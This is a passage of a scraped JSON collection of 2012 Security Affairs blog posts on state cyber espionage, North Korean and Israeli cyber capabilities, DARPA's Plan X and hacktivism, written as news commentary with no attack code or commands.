continue at a high level and will represent a growing and persistent threat to U.S. economic security.\u201d\n\n\u201cChina is likely to remain an aggressive and capable collector of sensitive U.S. economic information and technologies, particularly in cyberspace,\u201d\n\nThe risks are concrete, in many occasion has been discussed about the continuous attacks of Chinese stated sponsor hackers against American networks. Officials from the FBI, the Department of Homeland Security and the Justice Department\u2019s national security division compose a special collective named \u201cTeam Telecom,\u201d in charge of review FCC applications by foreign-owned companies. The problem is really critic, on one side we have valuable business opportunity, on the other hand there is the security of the nation, for this reasons the group have to define a proper agreement to preserve both needs. In discussion is the routing of traffic from US Carriers (e.g. Verizon Communications Inc. or AT&T Inc) on networks the management of which is licensed by China Mobile.\n\nPersonally I feel very justified concerns of U.S. security experts, the risk of espionage is real must be managed with the utmost care to avoid catastrophic consequences.  I\u2019m more worried about the hardware that is destinated for a large consume and therefore can not for obvious reasons, be subjected to strict controls. Units of cars, home automation systems, control units for anti-theft devices, network devices for domestic and small business. In these areas, it is relatively easy to infiltrate modified hardware, simply drill a discounted cost. For consumer goods the customs are not equipped for the validation of hardware and we consider that similar devices may also be edited once they arrive at the distributions. The chain is objectively difficult to control.\n\nPierluigi Paganini\n\n \n\n", "topics": [{"topic_link": "https://securityaffairs.co/wordpress/tag/backdoors", "topic_name": "backdoors"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/china", "topic_name": "China"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/cyber-espionage", "topic_name": "cyber espionage"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/dod", "topic_name": "DoD"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/huawei", "topic_name": "Huawei"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/intelligence", "topic_name": "Intelligence"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/iran", "topic_name": "Iran"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/us", "topic_name": "US"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/zte-company", "topic_name": "ZTE company"}]}, {"news_name": "Google Online Security against state-sponsored attacks", "news_link": "https://securityaffairs.co/wordpress/6263/cyber-crime/google-online-security-against-state-sponsored-attacks.html", "title": "Google Online Security against state-sponsored attacks\t\t\t\t\t", "author": "Pierluigi Paganini", "author_link": "https://securityaffairs.co/wordpress/author/paganinip", "date": "June 9, 2012", "body": "According to a post of Eric Grosse, VP of security engineering at Google, on Google Online Security blog the company is constantly monitoring the web for malicious activity on its systems, with particular attention to attacks made by third parties to illegally access into users\u2019 accounts. Google declared that is ready to adopt measurements to mitigate cyber threats each time they receive an alert from intelligence or from their clients and also when their monitoring procedures reveal anomalies.\n\nThe company is preparing to offer a specific protection service for a restrict number of users that could be target of state-sponsored attacks. Every user potentially at risk will be advised with a message like the one proposed in the following picture:\n\n\n\nOf course the message is just an alert and it must be clear that it doesn\u2019t give the certainty that account has been hijacked, it\u2019s a communication to inform the user that its account could be victims of a phishing campaign, of an APT attack or of a malware. Purpose of the initiative is to mitigate or prevent potential damage caused by the attack.\n\nThat Google alert remarks\n\n\u201cIt\u2019s important to note that Google\u2019s internal systems are not compromised and that this message does not refer to one specific campaign,\u201d the page read. \u201cWe routinely receive abuse reports from users, as well as from our internal systems that monitor for suspicious login attempts and other activity.\u201d\n\nThe post also propose good practices to secure their account such as\n\nIn a typical scenarios for an attack the hacker tries to induce the victim to authenticate itself on fake web page, clone of the legitimate ones, to steal the credential.\n\nThe post invites the users to sign in looking https protocol in the Google login page.\n\nDespite the good intents of the initiative there are several concerns regarding how Google will be able to identify state-sponsored attacks.\nThe blog report:\n\nWe can\u2019t go into the details without giving away information that would be helpful to these bad actors, but our detailed analysis\u2014as well as victim reports\u2014strongly suggest the involvement of states or groups that are state-sponsored.\n\nWe believe it is our duty to be proactive in notifying users about attacks or potential attacks so that they can take action to protect their information. And we will continue to update these notifications based on the latest information.\n\nThe alert system already works in China where many users have been informed of possible attacks against their account. It\u2019s not first time that Google provide similar alerts, it\u2019s happened last year when it advised every Iranian user to check if their accounts had been hacked and also in early 2010, claiming that Chinese human rights activists had been targeted in an attack dubbed \u201cOperation Aurora\u201c.\n\nIt\u2019s not clear how Google will be able to identify a state sponsored attacks, but many experts are critics on the alerting procedure. However, state-sponsored attacks are complex to be intercepted in time, for example it\u2019s quite impossible to detect the exploits of a 0-day vulnerability before the attack can affect the victims.  Many experts believe that the company could access to a huge quantity of information to identify the possible source of the attacks.\n\nWill be Google also efficient when US hackers will try to infiltrate foreign government account?

The South Korean man in September 2009 traveled to Shenyang, northeastern China, to meet agents of an alleged North Korean trading company with to acquire software games to be sold in the South. It seems that the South Korean man was informed on the real identity of the agents that belonged to the North\u2019s Reconnaissance General Bureau.\n\nThe Bureau is responsible for collecting strategic, operational, and tactical intelligence for the Ministry of the People\u2019s Armed Forces and it is also responsible for infiltrating intelligence personnel into South Korea.\n\nThe South Korean man acquired dozens of games for a price that was a third the cost of the same kind of software in the South, but it has been discovered that the games were infected with a malware viruses and that the buyer was informed of its presence.\n\nThe games were sold by the South Korean man to operators of online games of his country, the virus infected the applications were used to transform user\u2019s machine in a zombie of the botnets created with the purpose to launch distributed denial-of-service attack against Incheon International Airport. In March 2011, at least three times the airport has been attacked, fortunately without success thanks to the response of the intelligence.\n\nThe South Korean intelligence suspect that the attacks were prepared by North\u2019s Reconnaissance General Bureau. In September a similar attack to the flight data processor paralyzed air traffic control at Incheon International Airport for nearly an hour.\n\nThe main concern is related to the spread of a virus, a cyber weapon used by North Korean government, to interfere with air traffic control at Incheon International Airport.\n\nMany experts are sure that North Korea is conducing a massive cyber campaign against South Koreas to destroy critical infrastructures in the South such as power plants and water.\n\nAccording source of intelligence of South Korea \u201cThe North\u2019s Reconnaissance General Bureau has hired group of hackers, mainly located in China, to conduct attacks against strategic targets such as the the South.\n\nWhich are the cyber capabilities of North Korea?\n\nNorth Korea has the highest percentage of military personnel in relation to population than any other nation in the world, with approximately 40 enlisted soldiers per 1000 people with a considerable impact on the budge of the country.  Don\u2019t forget also that North Korea has capabilities that also include chemical and biological weapons.  A defector has declared that North Korea has increased its cyber warfare unit to staff 3,000 people and it is massive training its young prodigies to become professional hackers.\n\nThe large cyber force responds directly to the command of the country\u2019s top intelligence agency, the General Reconnaissance Bureau. Last year satellite images related to the area that is suspected to host North Korea\u2019s \u2018No. 91 Office\u2019 appeared online. The unit is based in the Mangkyungdae-district of Pyongyang dedicated to computer hacking, its existence was revealed in a seminar on cyber terror in Seoul.\n\n\n\nAccording to the revelation of Army General James Thurman, the commander of US Forces Korea, the government of Pyongyang is massively investing in cyber warfare capabilities, recruiting and forming a high skilled team of hackers to be engaged in offensive cyber operations against a hostile government and in cyber espionage activities.\n\nIn more than one occasion the North Korea has threatened the South promising waves of attacks, and the cyber offensive option is the most plausible considering the advantage in terms of efficiency, noise, and political impact.\n\nNorth Korea\u2019s electronic warfare capabilities are second only to Russia and the United States, a South Korean expert claimed Thursday.\n\nProfessor Lee Dong-hoon of the Korea University Graduate School of Information Security said the North Korea\u2019s electronic warfare capabilities are second only to Russia and the United States, a South Korean expert claimed Thursday.\n\n\u201cNorth Korea has been preparing for cyber warfare since the late 1980s and is now the third strongest after Russia and the U.S.,\u201d\n\nhe said at the Defense Security Command\u2019s defense information security conference in Seoul.\n\n\u201cIn North Korea the state nurtures cyber (warfare) personnel to achieve military aims, and is capable of conducting various cyber attacks including denial of service and hacking.\u201d\n\nHe quoted the distributed denial of service, or DDoS, attack in July 2009 that is suspected to have been launched by the Pyongyang Computer Technology University.\n\nRecently, from April 28 until May 13, GPS signals were jammed here causing difficulties in air and marine traffic controls of South Korea, the origin of attacks was located on the North Korean boundary, no doubts that it was arranged by North Korean intelligence.\n\nAccording to the security specialist, South Korea is not prepared to respond to the attacks arranged by Pyongyang governments and this consideration must induce serious concern regarding the critical political situation in the area.\n\nThe same opinion and concerns on North Korea\u2019s cyber warfare capabilities are shared by the chief of the Defense Security Command Army Lieutenant General Bae Deag-sig that declared:\n\n\u201cNorth Korea is attempting to use hackers to infiltrate our military\u2019s information system to steal military secrets and to incapacitate the defense information system,\u201d Bae said.\n\n\u201cThe military is updating the information protection policies and systems as part of the efforts to strengthen its response capabilities.\u201d\n\nNorth Korea, in the cyber scenario, is assuming a determinant role that approaches it important to the one related to historical cyber countries such as China and Russia. The evolution of the conflicts and its increasing propensity to adopt cyber operations should lead many concerns. In the short term to fight the cyber threat it is necessary a significant investment of the countries of the Asia Pac area in cyber warfare capabilities, South Korea first, I am unfortunately convinced that dialogue with North Korea at this time of profound change for the country is very difficult.\n\nPierluigi Paganini\n\n(Security Affairs \u2013 North Korea, Information Warfare)\n\n", "topics": [{"topic_link": "https://securityaffairs.co/wordpress/tag/asia-pac", "topic_name": "Asia-Pac"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/botnets", "topic_name": "Botnets"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/china", "topic_name": "China"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/critical-infrastructure", "topic_name": "critical infrastructure"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/cyber-army", "topic_name": "cyber army"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/cyber-warfare", "topic_name": "cyber warfare"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/cyber-weapon", "topic_name": "cyber weapon"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/denial-of-service-attack", "topic_name": "denial-of-service attack"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/hackers", "topic_name": "Hackers"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/intelligence", "topic_name": "Intelligence"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/no-91-office", "topic_name": "No. 91 Office"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/north-korea", "topic_name": "North Korea"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/russia", "topic_name": "Russia"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/virus", "topic_name": "virus"}]}, {"news_name": "Israel between cyber war and cyber warfare business", "news_link": "https://securityaffairs.co/wordpress/6167/intelligence/israel-between-cyber-war-and-cyber-warfare-business.html", "title": "Israel between cyber war and cyber warfare business\t\t\t\t\t", "author": "Pierluigi Paganini", "author_link": "https://securityaffairs.co/wordpress/author/paganinip", "date": "June 6, 2012", "body": "It\u2019s not a secret, Israel military is one of the most advanced and active cyber army that is using cyber-warfare to attack its enemy in the cyber space. For years Israel conducts cyber espionage and cyber offensive operations that allow the state to operate undisturbed, away from media pressure always attentive to the controversial international policy of the government of the country.\n\nTo Israel must recognized the great merit of having invested significantly in cyber warfare in advance respect other states,  pushing the mostly on internal resources and on forming their own militias to cyber offensive techniques.\n\n\u201cThe IDF has been engaged in cyber activity consistently and relentlessly, gathering intelligence and defending its own cyber space. Additionally if necessary the cyber space will be used to execute attacks and intelligence operations,\u201d\n\nThis statement published on the Israel Defense Forces (IDF) website, summarized the Israeli military approach to cyber warfare considering it in same way of conventional conflicts, admitting intelligence operations and cyber attacks against foreign governments.\n\n\n\nAccording the information published on the IDF website the IDF Operations Department is the real core of IDF cyber warfare, giving the guidelines for the definition of cyber operations against the enemy of Israel.\n\nBut what\u2019s the meaning for \u201ccyber operations\u201d?\n\nWith the term cyber operation is referred the usage of technology to interfere and destroy enemy projects with cyber attacks and cyber espionage activities, this new area of military discipline is often associated to conventional interventions to increase their efficiency and force.\n\n\u201cThere are many, diverse, operational cyber warfare goals, including thwarting and disrupting enemy projects that attempt to limit operational freedom of both the IDF and the State of Israel, as well as incorporating cyber warfare activity in completing objectives at all fronts and in every kind of conflict,\u201d according to declarations published.\n\nReading the declaration it\u2019s impossible to don\u2019t think to the recent events of Flame malware detecting and the revelations on Stuxnet project and the US \u201cOlympic Games\u201d operation. Both cases represents good example of the destructive power of cyber weapon used against critical infrastructure of a country. Meanwhile it seems sure the involvement of Israeli in the attacks against Iran conducted in collaboration with US using Stuxnet malware, no verified information are available on the creators of Flame agent.\n\nAccording Israeli software companies, their country\u2019s expertise with cyber weapons is very high supported by a strong government commitment that has created a pool of army-trained hacking talent.\n\nLet\u2019s propose the case of the Gil Shwed, founder, CEO, and chairman of board of Check Point Software Technologies Ltd, who served in an elite intelligence unit and that, according his declarations, has recruited from the military cyber corps high skilled personnel for his company. The case is not isolated , Cyber-Ark Software Ltd., a firm specialized in cyber-defense drew on the same source to recruit specialists in the computer industry, has reported its Chief Executive Officer Udi Mokady said.\n\nIsrael has transformed the hacking in an impressive business that today has a great impact on national security and also on the economy of the country.\n\nIts security sector is considered one of the most advanced all over the world, foreign governments and private companies refer it to protect their critical system, it has been estimated the official market amount is around $18 billion, but it is just the tip of the iceberg.\n\nThe awareness on the efficiency of a cyber attack is shared in the high level of the Israeli government, Prime Minister Benjamin Netanyahu said:\n\n\u201cThis is an era that we\u2019re entering into where entire societies can be paralyzed by cyber attack, and Israel is no different,\u201d  \u201cWe are committed to being one of the three leading cyber powers of the world.\u201d\n\nGovernment of Israel is massive investing on cyber security demonstrating a great attention to incoming cyber threats, it has announced that it will expend more than $13 million in the coming years to develop new technologies for cyber defense.\n\nNetworks, critical infrastructures, military environments and private companies must be protected from foreign cyber attacks.\n\nIsraeli networks are daily goal of thousands of cyber attacks conducted by hostile governments, hacktivist and independent hackers who want to compete with one of the most advanced nations, for obvious reasons are reported only in presence of substantial losses or sensational data breach.\n\nThe National Cyber Committee, a department under direct control of the Prime Minister\u2019s Office, will coordinate with the Science and Technology Ministry the project during at least three years,  reserving each year $525,000 for advanced cyber security projects sponsored by corporations, and $80,000 to generation with scholarships.\n\nThe government of course has a great interest to improve security of its critical infrastructures, due this reason it will push the researchers to develop project that will cover there delicate areas such as banking, defense, government and smart grids in general.\n\nThe same thought is shared by hostile countries that daily attack Israeli system stressing the critical infrastructure of the country.\n\nIn January 2012 massive attacks against The Tel Aviv Stock Exchange and El Al Israel Airlines Ltd. (ELAL) have blocked the operations leaving their websites down.\n\n\n\nIsraeli security services are engaging a security challenge with external hackers trying to put in place defense systems also able to trace back the origins of the attacks.\n\nYitzhak Ben Israel responsible for the creation of the National Cyber Directorate declared:\n\n\u201cWe\u2019re in pretty good shape with current threats, but the threats next year and two years from now are just going to get higher and we need to keep up,\u201d\n\n\u201cOur biggest worry is damage to our major life systems that are all controlled by computers.\u201d\n\nA so complex situation is stimulating the security market and its growth, to give an example let\u2019s analyze the progress made by the Check Point\u2019s Software Technologies, traded on the Nasdaq Stock Market, that has increase its quotation more over 70 percent in the past two years reducing market share of its direct competitors Cisco Systems Inc. and Juniper Network, both have fallen more than 30 percent in the same period.\n\nOther private companies are also investing on the creation of new solutions that could be proposed to te cyber security market, for example Elbit Systems Ltd., maybe the Israel\u2019s biggest non-government defense contractor, will propose to the market a new cyber-security simulator, designed to train government and private companies to the proper response to cyber attacks.\n\nIsraeli private companies are proofing the hacking methods proposing high level consulting to the businesses of the world, developing and studying the most sophisticated attacks technologies and creating powerful tools and systems for both cyber offense and defense.\n\nThe reliability of Israeli companies is worldwide recognized, companies such as  Check Point have a 10.7 percent share of the world cyber security market by revenue in 2009, according to a November 2010 study by market researcher IDC.\n\nThe proceeds from information technology products are around $4.2 billion in 2010, with more than half of that coming from security, stating to the declaration of Yafit Katz- Rubin, business development manager for the industry at the Israel Export Institute in Tel Aviv.\n\nOf course a so sustained market is attracting also external capital and investors, Goldman joined Jerusalem Venture Partners in a $40 million investment in Cyber- Ark, which has its research and development facilities in Petach Tikva, Israel.\n\nIn my personal opinion the investments in cyber defense are really judicious and profitable but we must also consider drawbacks to a totally opening to the security markets. The same companies that propose defense systems could arm foreign state militia with serious consequences. The belief that these concerns are only present in spy story films is wrong, the business follow only the money reason and it is already happened in the past that security companies has violated the technological embargo decided for rogue states such as Syria and Iran.\n\nSo let\u2019s support the growth of the security industry, but beware the lure of the money god. Safety is everyone\u2019s responsibility.\n\nPierluigi Paganini\n\n", "topics": [{"topic_link": "https://securityaffairs.co/wordpress/tag/olympic-games", "topic_name": "'Olympic Games'"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/critical-infrastructures", "topic_name": "Critical infrastructures"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/cyber-espionage", "topic_name": "cyber espionage"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/cyber-security-market", "topic_name": "cyber security market"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/cyber-war", "topic_name": "cyber war"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/cyber-warfare", "topic_name": "cyber warfare"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/cyber-weapon", "topic_name": "cyber weapon"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/data-breach", "topic_name": "data breach"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/flame", "topic_name": "Flame"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/hackers", "topic_name": "Hackers"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/intelligence", "topic_name": "Intelligence"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/iran", "topic_name": "Iran"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/israel", "topic_name": "Israel"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/israel-defense-forces", "topic_name": "Israel Defense Forces"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/malware-2", "topic_name": "malware"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/stuxnet", "topic_name": "stuxnet"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/technological-embargo", "topic_name": "technological embargo"}]}, {"news_name": "Plan X, new lymph to US cyber warfare capabilities", "news_link": "https://securityaffairs.co/wordpress/6074/intelligence/plan-x-new-lymph-to-us-cyber-warfare-capabilities.html", "title": "Plan X, new lymph to US cyber warfare capabilities\t\t\t\t\t", "author": "Pierluigi Paganini", "author_link": "https://securityaffairs.co/wordpress/author/paganinip", "date": "June 4, 2012", "body": "Recent events have demonstrated the strategic importance of the cyber strategy the needs to chair the cyber space, many experts sustains that the cyber war era is just begun, due this reason the Pentagon is involving the private companies, universities and even computer-game companies to develop technologies to improve its cyber warfare capabilities.\n\nEvents such as the diffusion of Flame malware and the revelations on the genesis of Stuxnet are inducing many concerns of US administration regarding the possibility of cyber attacks against America.\n\nObama administration is massive investing in the cyber warfare preparing its structures to respond to cyber threats and also creating the condition to launch effective attacks against foreign and hostile states. If confirmed the \u2018Olympic Games\u2019 operation if the first sample of offensive conducted in the cyber space and arranged without conventional weapon, using digital attacks instead of military operations.\n\nThe project that will involve also private non-military entities in what is considered \u201ca call to arms\u201d has been names Plan X, it is more oriented on protecting the Defense Department\u2019s computer systems than on disrupting or destroying those of enemies. Plan X is a project of the DARPA (Defense Advanced Research Projects Agency), a Pentagon section responsible for the development of new technology for use by the military.\n\n\u201cBecause the origins of cyberattack have been in the intelligence community, there\u2019s a tendency to believe that simply doing more of what they\u2019re doing will get us what we need,\u201d\n\nsaid Kaigham J. Gabriel, acting director of DARPA.\n\n\u201cThat\u2019s not the way we see it. There\u2019s a different speed, scale and range of capabilities that you need. No matter how much red you buy, it\u2019s not orange.\u201d\n\nAccording the fundamental of a military tactical one of the main aspects of a war is the deep knowledge of the battlefield, for this reason one of the main projects to be financed is the tracking of cyberspace and all entities that populate it, its map have to be updated over time to allow precise monitoring of main area of battle. Other projects will be related to the hardening of Operating Systems to resist to any king of cyber attacks in different scenarios, probably mobile as desktop.The officials seems to have a clear idea of the OSs of the future, totally different from the one we ordinary use.\n\n\n\nMany experts sustain the one of the primary target is to develop a new generation of cyber soldier, artificial intelligence able to prevent cyber attacks and that is able to conduct powerful offensives automatically. The research program promoted by DARPA agency has a duration of five years and will be financed with $110 million starting from this summer. The agency has allocated a total budget of $1.54 billion from 2013 to 2017 with the specific target to increase cyber-offense capabilities.\n\nProjects such as the X Plan marked a turning point in approach of US government to the matter, which expects to the opening a sensible contribute, a new lymph. Cyber warfare has always been a dark field, unchallenged domain of intelligence representatives, now the Pentagon intends to ask for support to private industry to develop new cyber weapons.\n\nBut are we confident that the project Plan X is not simply a pretext to formalize what is going on for years?\n\nThe recruitment model proposed is not new and has long been adopted by other major powers such as China. In an ideal situation the institution should start from below, from schools to present the cyber threats and educate students on the techniques of prevention. This should only be a first step, which should be followed by the arrangement of specific hacking training programs. Many Eastern countries, especially China, are investing heavily in the potential of its young people who are now enrolled and engaged in intense training programs to increase their cyber capabilities.\n\nLet consider the Chinese model, these new recruits are primarily interested in the subject and the central government provides a wide range of relief for deserving students and their families. This in my view means looking ahead, prepare for a future that is radically changing the way we live.\n\nIt is required a global change involving the new generation, giving to young people tools and knowledge to understand how disastrous can be a cyber attack and how much is sensitive to the choice of participating in a protest action style Anonymous. We tell them that with the same mode of attack it is possible to offend a hostile country, damaging telecommunications systems and other critical infrastructure.\n\nThe program launched by DARPA, in my opinion, comes in a crucial moment in which the strategic importance of the garrison in the cyber space has become a prerequisite for the cyber strategy of each country. Projects such as Plan X does not add anything new to the operational reality of many states, but it has formalized collaborations that go on for years in more or less transparent way.\nCyber Weapons , systems and applications for monitoring, malware for cyber espionage make use of the contribution of private industry for years.\nThe road is the right one, and we crossed the threshold of a new era, one where the fight wars with cyber weapon and bits instead of guns and bullets, in which the hackers are a new generation of soldiers.\n\nPierluigi Paganini\n\n \n\n \n\n", "topics": [{"topic_link": "https://securityaffairs.co/wordpress/tag/olympic-games", "topic_name": "'Olympic Games'"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/china", "topic_name": "China"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/computer-game-companies", "topic_name": "computer-game companies"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/content-filtering", "topic_name": "Content filtering"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/critical-infrastructures", "topic_name": "Critical infrastructures"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/cyber-attacks", "topic_name": "Cyber attacks"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/cyber-crime", "topic_name": "Cyber Crime"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/cyber-threats", "topic_name": "cyber threats"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/cyber-warfare", "topic_name": "cyber warfare"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/cyber-weapon", "topic_name": "cyber weapon"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/cyber-weapons", "topic_name": "cyber weapons"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/cyberwarfare", "topic_name": "cyberwarfare"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/darpa", "topic_name": "DARPA"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/ddos", "topic_name": "DDoS"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/espionage", "topic_name": "Espionage"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/flame", "topic_name": "Flame"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/hackers", "topic_name": "Hackers"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/hacking", "topic_name": "Hacking"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/intelligence", "topic_name": "Intelligence"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/malware-2", "topic_name": "malware"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/pentagon", "topic_name": "Pentagon"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/plan-x", "topic_name": "Plan X"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/stuxnet", "topic_name": "stuxnet"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/us", "topic_name": "US"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/warfare", "topic_name": "warfare"}]}, {"news_name": "The hacktivism phenomenon", "news_link": "https://securityaffairs.co/wordpress/6086/cyber-crime/the-hacktivism-phenomenon.html", "title": "The hacktivism phenomenon\t\t\t\t\t", "author": "Pierluigi Paganini", "author_link": "https://securityaffairs.co/wordpress/author/paganinip", "date": "June 4, 2012", "body": "\n\nThe last years have been characterised by the escalation of operations conducted by hacktivist groups, such as the famous Anonymous, which have expressed social dissent through cyber attacks. In contemporary society technology plays a crucial role, and is used as a new cultural vehicle and even aggregation element. It\u2019s a natural evolution towards technology usage and also a carrier of social dissent against the policies of governments and private companies.\n\nGroups such as Anonymous are classic examples of the phenomenon known as \u201chacktivism\u201d which refers to the usage of computers, and computer networks, to express social protest, or to promote a political ideology. This form of protest isn\u2019t recent; the term in fact was introduced for the first time in 1996 by a hacker named Omega, who was a member of the famous group of hackers the \u201cCult of the Dead Cow\u201d. The hacktivists attack IT infrastructures with legal and illegal tools to perform their operations of protest, such as denial-of-service attacks, information theft, data breach, web site defacement, typosquatting, and any other methods of digital sabotage.\n\nAnonymous and its operations are at the centre of a heated debate, with public opinion and industry experts divided between those who believe the collective is a group of cyber criminals, and those who take due account of the phenomenon, trying to understand the dynamics of its genesis, and not neglecting the added value of their participation in social dialogue.\n\nAccording to the study \u201cData Breach Investigations Report\u201d published by Verizon, hacktivists stole almost twice as many records of ordinary cybercrime from organisations and government agencies, demonstrating how dangerous the phenomenon is.\n\nThe most common type of attacks by the Anonymous group is without doubt the Distributed Denial of Service (DDoS), used to make a site or a web service unavailable due to an enormous quantity of requests sent over a short period of time.\n\nBut Anonymous and hacktivists in general are demonstrating increasing skills in their attacks, and experts are sure we will witness an increase in the volume of their operations, with possible extensive damage.\n\nIn this view, the latest attacks represent an element of innovation because, although it is always a DDoS attack, the method used has profoundly changed since conception. Now a user can, by simply visiting a web page and without any interaction, unwittingly start to flood a victim with unwanted traffic. The trick is possible by simply hiding JavaScript procedures, specifically developed to be interpreted by common web browsers, within the web pages.\n\nHacktivism has made a quantum leap with this new method for two simple reasons:\n\nThe offensive force has increased dramatically.\n\nFrom a legal standpoint, it is hard to attribute criminal liability to each user. Previously, for example with the attack called LOIC that was used to hack VISA and Mastercard, a user who participated could risk liability because an element of willingness to be involved could be established. However, in the latest style of attack today, a user can claim to be unaware. This subtle aspect could be stimulus for a wide category of undecided persons, who share the \u2018hacktivist\u2019 ideology, to overcome their fear of incurring legal process and consequently participate in hacking operations.\n\nHacktivism also has a cyber warfare connotation, with some groups having a total aversion to any form of control and monitoring, making these groups of hackers oppose any government(s).\n\nThe boundary between interpretation of an operation as a simple act of protest or as cybercrime is thin. While many operations are limited to DDoS against a few web sites, resulting in their closure or suspension of operations, on more than one occasion the hacks have resulted in the acquisition, and/or disclosure to the public, of sensitive information with serious consequences.\n\nThis happened last Christmas when Wikileaks published, with the support of Anonymous, more than five million e-mails from Texas-based global security think tank company Stratfor, a global intelligence firm. The exposed material shows how government and diplomatic sources all around the world give Stratfor clear advanced knowledge of events and of the politic strategies, all in exchange for money. A great web of informants, government employees, embassy staff and journalists, has been recruited everywhere, and paid through Swiss bank accounts and pre-paid credit cards. On the other hand of course, the actions of groups of hacktivists represent a serious threat to private industry and the national security of each country. The group\u2019s attacks have been shown to bring about the blocking of services provided by a company, to gain access to sensitive information whose disclosure could undermine the internal balance of a country and its relationship with allied states. And it\u2019s for this reason that hacktivism is considered within a cyber strategy as a major cyber threat which can cripple, with its attacks, critical infrastructures, financial services and government agencies.\n\nGroups of hacktivist are considered as the uncontrollable variables in cyber space, capable of surprising us with striking operations worthy of the most skilled cyber army.\n\nIs it possible to use the group and its popularity as a cyber weapon? How is it possible?\n\nSeveral intelligence agencies believe that it could be more profitable to influence the operations against strategic objectives. Let\u2019s imagine fake hacktivist cells that recruit ordinary people to direct attacks against institutions and hostile governments. We found, on more than one occasion, how dangerous a breath of wind of protest through the new social media can be.\n\nIntelligence operations and studies of the phenomenon are preparatory to the approach, but with regard to the possibility of infiltrating the group, this could of course be achieved by conditioning, for example through financial compensation and other incentives, the medium and high level representatives of the groups \u2212 those people that define the strategies of protest. There are risks related to negotiation with unstable and mutable organisations that we do not fully understand, but history teaches that such agreements are possible, and have indeed occurred in the past, such as between states and criminal organisations. In some ways this approach is similar to what can occur when government intelligence agencies discover a weakness in existing cyber infrastructures and, rather than report and assist to repair the weakness, they allow the weakness to remain so as to be able to exploit it for their own offensive purposes now or in the future. This is different to \u2018ethical hacking\u2019 where a person (such as co-author of this article Pierluigi Paganini) hacks to find weaknesses in a system for the purpose of identifying and removing the weakness, and to help build defences. Ross Anderson, the well known professor in Security Engineering at Cambridge University, is reported to have asserted that the \u201clions\u2019 share\u201d of the UK government\u2019s cyber budget is allocated to develop cyber offence capabilities.\n\nIs hacktivism only a threat or also a voice to listen to? What can we expect for the future?\n\nSome forms of hacktivism protests are certainly illegal, but we must consider that they are expressions of dissent shared between large communities; they are the voice of masses. The demonstration is in the number behind each attack. These guys are not alone, they have a lot of common people behind them. The main events of protest in history were always characterised by elements of illegality due to their connotation of opposing the governments in question. From a legislative perspective, we must distinguish a hacktivist from a cyber criminal. Although the damages are to be considered in high regard, there are countless methods of judgment regarding the actions of Anonymous and similar groups. In terms of security, the group is without doubt considered a threat due to the capabilities shown and the objectives selected. In another sense they do bring to public awareness some of the clear vulnerabilities in existing cyber systems, and thinking people will be asking themselves, and hopefully others, \u201cWhy are our critical cyber systems so vulnerable?\u201d Hacktivism can therefore be seen as helping to motivate a shift towards much needed improvements. Politically, I think that Anonymous is a voice to be taken into account. Ideologies could not be repressed with the arrests, and what is possibly unique about Internet enabled social activism, such as the Arab Spring, is that it can reflect a widespread shift or evolution in popular opinion or consciousness.\n\nThese observed attacks should give us cause to reflect. I think the group is currently in a state of transition which, despite having reached a critical mass of supporters, has began to split into numerous cells scattered throughout the world.\n\nFor now, these cells appear to be driven by common goals, but what will happen tomorrow?\n\nIn a heterogeneous scenario, the risk that external agents can infiltrate the group influencing policy is concrete. New operations can be organised in the name of the group with unpredictable consequences, foreign states or law enforcement may involve masses of people and convince unaware hacktivist to conduct ideological battles. The time of hiding, in the form of protest, could begin 